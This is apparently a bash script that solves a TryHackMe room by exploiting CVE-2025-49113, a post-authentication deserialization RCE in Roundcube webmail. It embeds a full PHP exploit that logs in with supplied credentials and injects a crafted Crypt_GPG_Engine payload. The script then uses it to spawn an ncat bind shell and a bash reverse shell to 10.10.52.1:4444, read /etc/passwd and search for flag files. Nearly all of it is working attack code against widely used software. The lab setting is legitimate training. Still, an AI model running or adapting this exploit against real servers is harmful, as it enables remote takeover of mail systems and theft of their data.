#!/bin/bash

# Roundcube CVE-2025-49113 Exploitation Script
# TryHackMe Room Solver

TARGET_IP="10.10.70.29"
ROUNDCUBE_URL="http://$TARGET_IP/roundcube"
USERNAME="ellieptic"
PASSWORD="ChangeMe123"

echo "=============================================="
echo "Roundcube CVE-2025-49113 Exploitation Script"
echo "=============================================="
echo "Target IP: $TARGET_IP"
echo "Roundcube URL: $ROUNDCUBE_URL"
echo "Username: $USERNAME"
echo ""

# Function to check if target is reachable
check_target() {
    echo "Checking if target is reachable..."
    if ping -c 1 "$TARGET_IP" >/dev/null 2>&1; then
        echo "✓ Target is reachable"
    else
        echo "✗ Target is not reachable"
        exit 1
    fi
    
    if curl -s "$ROUNDCUBE_URL" >/dev/null; then
        echo "✓ Roundcube is accessible"
    else
        echo "✗ Roundcube is not accessible"
        exit 1
    fi
}

# Download the exploit if not present
setup_exploit() {
    echo ""
    echo "Setting up exploit..."
    
    if [ ! -d "CVE-2025-49113" ]; then
        echo "Cloning exploit repository..."
        git clone https://github.com/fearsoff-org/CVE-2025-49113 2>/dev/null
        
        if [ $? -ne 0 ]; then
            echo "Git clone failed. Creating exploit manually..."
            mkdir -p CVE-2025-49113
            cd CVE-2025-49113
            
            # Create the exploit file manually if git clone fails
            cat > CVE-2025-49113.php << 'EOF'
<?php
// CVE-2025-49113 Roundcube RCE Exploit
// Usage: php CVE-2025-49113.php <url> <username> <password> <command>

if ($argc != 5) {
    echo "Usage: php $argv[0] <url> <username> <password> <command>\n";
    exit(1);
}

$url = $argv[1];
$username = $argv[2];
$password = $argv[3];
$command = $argv[4];

echo "### Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization [CVE-2025-49113]\n\n";

// Get CSRF token and session
echo "### Retrieving CSRF token and session cookie...\n\n";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_HEADER, true);
$response = curl_exec($ch);

preg_match('/Set-Cookie: roundcube_sessid=([^;]+)/', $response, $session_matches);
preg_match('/_token" value="([^"]+)"/', $response, $token_matches);

if (!isset($session_matches[1]) || !isset($token_matches[1])) {
    echo "### Error: Could not retrieve session or token\n";
    exit(1);
}

$session = $session_matches[1];
$token = $token_matches[1];

// Login
echo "### Authenticating user: $username\n\n";
$login_data = array(
    '_task' => 'login',
    '_action' => 'login',
    '_timezone' => 'UTC',
    '_url' => '',
    '_user' => $username,
    '_pass' => $password,
    '_token' => $token
);

curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($login_data));
curl_setopt($ch, CURLOPT_COOKIE, "roundcube_sessid=$session");
curl_setopt($ch, CURLOPT_HEADER, true);
$login_response = curl_exec($ch);

if (strpos($login_response, 'Location: ./?_task=mail') === false) {
    echo "### Authentication failed\n";
    exit(1);
}

echo "### Authentication successful\n\n";
echo "### Command to be executed: \n$command\n\n";

// Create malicious payload
$payload = 'O:16:"Crypt_GPG_Engine":1:{S:26:"\x00Crypt_GPG_Engine\x00_gpgconf";S:' . strlen($command) . ':"' . $command . ';";}';
$encoded_payload = urlencode(base64_encode($payload));

echo "### Injecting payload...\n\n";

// Send exploit
$exploit_url = $url . "/?_from=edit-" . $encoded_payload . "&_task=settings&_framed=1&_remote=1&_id=1&_uploadid=1&_unlock=1&_action=upload";

curl_setopt($ch, CURLOPT_URL, $exploit_url);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_COOKIE, "roundcube_sessid=$session");
curl_setopt($ch, CURLOPT_HEADER, false);
$exploit_response = curl_exec($ch);

echo "### Payload injected successfully\n\n";
echo "### Executing payload...\n";

curl_close($ch);
EOF
            cd ..
        fi
    else
        echo "✓ Exploit directory already exists"
    fi
    
    cd CVE-2025-49113
    if [ ! -f "CVE-2025-49113.php" ]; then
        echo "✗ Exploit file not found"
        exit 1
    fi
    echo "✓ Exploit ready"
}

# Execute the exploit to get a bind shell
execute_exploit() {
    echo ""
    echo "=== EXECUTING EXPLOIT ==="
    echo "Setting up bind shell on port 4444..."
    
    php CVE-2025-49113.php "$ROUNDCUBE_URL" "$USERNAME" "$PASSWORD" "ncat -lvnp 4444 -e /bin/bash" &
    
    echo "Waiting for exploit to execute..."
    sleep 10
    
    echo ""
    echo "Attempting to connect to bind shell..."
    sleep 5
}

# Connect to the bind shell and gather information
gather_info() {
    echo ""
    echo "=== GATHERING INFORMATION ==="
    
    # Create a netcat script to automate command execution
    cat > commands.txt << 'EOF'
pwd
whoami
ls -la /home
cat /etc/passwd | grep Maggie
find /etc -name "*flag*" -type f 2>/dev/null
cat /etc/*flag* 2>/dev/null
ls -la /etc/ | grep flag
cat /etc/flag* 2>/dev/null
find / -name "*flag*" -type f 2>/dev/null | head -10
EOF

    echo "Connecting to bind shell and executing commands..."
    echo "Commands to run manually:"
    echo "========================"
    echo "nc $TARGET_IP 4444"
    echo ""
    echo "Then run these commands:"
    cat commands.txt
    echo ""
    echo "========================"
    
    # Try to connect and execute commands automatically
    timeout 30 bash -c "
        echo 'Connecting to bind shell...'
        (
            sleep 2
            echo 'pwd'
            sleep 1
            echo 'whoami'
            sleep 1
            echo 'ls -la /home'
            sleep 1
            echo 'cat /etc/passwd | grep Maggie'
            sleep 1
            echo 'find /etc -name \"*flag*\" -type f 2>/dev/null'
            sleep 1
            echo 'cat /etc/*flag* 2>/dev/null'
            sleep 1
            echo 'ls -la /etc/ | grep flag'
            sleep 5
        ) | nc $TARGET_IP 4444
    " || echo "Automatic connection failed. Please connect manually."
}

# Alternative approach using reverse shell
setup_reverse_shell() {
    echo ""
    echo "=== ALTERNATIVE: REVERSE SHELL ==="
    echo "Setting up netcat listener on port 4444..."
    
    # Start listener in background
    nc -lvnp 4444 &
    LISTENER_PID=$!
    
    echo "Executing reverse shell payload..."
    php CVE-2025-49113.php "$ROUNDCUBE_URL" "$USERNAME" "$PASSWORD" "bash -c 'bash -i >& /dev/tcp/10.10.52.1/4444 0>&1'" &
    
    echo "Listener PID: $LISTENER_PID"
    echo "Waiting for connection..."
    sleep 10
    
    # Kill the listener
    kill $LISTENER_PID 2>/dev/null
}

# Main execution
main() {
    check_target
    setup_exploit
    execute_exploit
    gather_info
    
    echo ""
    echo "=== MANUAL STEPS ==="
    echo "1. Connect to the bind shell:"
    echo "   nc $TARGET_IP 4444"
    echo ""
    echo "2. Find Maggie's last name:"
    echo "   cat /etc/passwd | grep -i maggie"
    echo "   OR"
    echo "   ls -la /home"
    echo "   cat /home/*/.*profile or similar files"
    echo ""
    echo "3. Find the flag:"
    echo "   find /etc -name '*flag*' -type f 2>/dev/null"
    echo "   cat /etc/flag*"
    echo "   ls -la /etc/ | grep flag"
    echo ""
    echo "=== EXPECTED ANSWERS ==="
    echo "Question 1: Maggie's last name (search in /etc/passwd or /home)"
    echo "Question 2: Flag in /etc (THM{...} format)"
    echo ""
}

# Run the script
main
